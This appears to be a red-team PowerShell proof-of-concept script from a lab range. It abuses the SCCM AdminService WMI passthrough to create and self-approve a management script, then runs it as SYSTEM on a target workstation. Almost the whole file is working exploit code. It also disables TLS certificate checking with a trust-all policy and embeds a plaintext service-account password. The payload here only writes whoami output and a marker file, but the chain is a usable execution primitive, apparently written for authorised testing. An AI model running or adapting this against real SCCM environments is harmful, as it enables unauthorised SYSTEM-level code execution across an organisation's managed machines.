# WT039: Script exec as SYSTEM via AdminService wmi passthrough (SCCMHunter method) — analyst_t1 (ws01 ATTACK)
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy14 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy14
$mp = 'mbr02.range.local'
$resourceId = 16777220   # WS01
$cred = New-Object System.Management.Automation.PSCredential('range\svc_sccm', (ConvertTo-SecureString 's3rv1c3_SCCM!' -AsPlainText -Force))
$base = "https://$mp/AdminService"
$guid = [guid]::NewGuid().ToString()

# Script content (runs as SYSTEM on client) + UTF-16LE BOM + base64
$script = "whoami > C:\Windows\Temp\wt039-system.txt`necho WT039-PROOF-SYSTEM-EXEC > C:\Windows\Temp\wt039-marker.txt`nwhoami"
$bom = [byte[]](0xFF,0xFE)
$bytes = [Text.Encoding]::Unicode.GetBytes($script)
$all = $bom + $bytes
$scriptBody = [Convert]::ToBase64String($all)

Write-Output "=== WT039 via AdminService wmi passthrough (guid=$guid) ==="

# 1. CreateScripts
Write-Output '[1] POST /AdminService/wmi/SMS_Scripts.CreateScripts/'
$createBody = @{
  ApprovalState = 3
  ParamsDefinition = ''
  ScriptName = 'WT039-SYSTEM-Proof'
  Author = 'RANGE\svc_sccm'
  Script = $scriptBody
  ScriptVersion = '1'
  ScriptType = 0
  ParameterlistXML = ''
  ScriptGuid = $guid
} | ConvertTo-Json
try {
  $r1 = Invoke-RestMethod -Uri "$base/wmi/SMS_Scripts.CreateScripts/" -Method Post -Body $createBody -ContentType 'application/json' -Credential $cred -TimeoutSec 30
  Write-Output ("    created: " + ($r1 | ConvertTo-Json -Compress -Depth 3))
} catch {
  $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
  Write-Output ("    ERROR " + $code + " : " + $_.Exception.Message)
  if ($_.ErrorDetails) { Write-Output ("    detail: " + $_.ErrorDetails.Message) }
  exit 1
}

# 2. Approve
Write-Output '[2] POST UpdateApprovalState'
$appBody = @{ Approver = ''; ApprovalState = '3'; Comment = '' } | ConvertTo-Json
try {
  $r2 = Invoke-RestMethod -Uri "$base/wmi/SMS_Scripts/$guid/AdminService.UpdateApprovalState" -Method Post -Body $appBody -ContentType 'application/json' -Credential $cred -TimeoutSec 30
  Write-Output ("    approved: " + ($r2 | ConvertTo-Json -Compress))
} catch {
  $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
  Write-Output ("    approve ERROR " + $code + " : " + $_.Exception.Message)
}

# 3. Run script on WS01
Write-Output '[3] POST RunScript'
$runBody = @{ ScriptGuid = $guid } | ConvertTo-Json
$r3 = Invoke-RestMethod -Uri "$base/v1.0/Device($resourceId)/AdminService.RunScript" -Method Post -Body $runBody -ContentType 'application/json' -Credential $cred -TimeoutSec 30
$opId = $r3.value
Write-Output ("    OperationId=" + $opId)

# 4. Poll ScriptResult
Write-Output '[4] Poll ScriptResult'
$done = $false
for ($i = 1; $i -le 20; $i++) {
  Start-Sleep -Seconds 10
  try {
    $pr = Invoke-RestMethod -Uri "$base/v1.0/Device($resourceId)/AdminService.ScriptResult(OperationId=$opId)" -Credential $cred -TimeoutSec 15
    $result = $pr.value.Result
    if ($result) {
      Write-Output ("[+] Result ready (attempt " + $i + ")")
      $pr | ConvertTo-Json -Depth 6
      $done = $true
      break
    }
    Write-Output ("    attempt " + $i + ": no result yet")
  } catch {
    Write-Output ("    attempt " + $i + ": " + $_.Exception.Message)
  }
}
if (-not $done) { Write-Output '[!] Timed out polling' }
Write-Output ("WT039_DONE guid=" + $guid + " op=" + $opId)
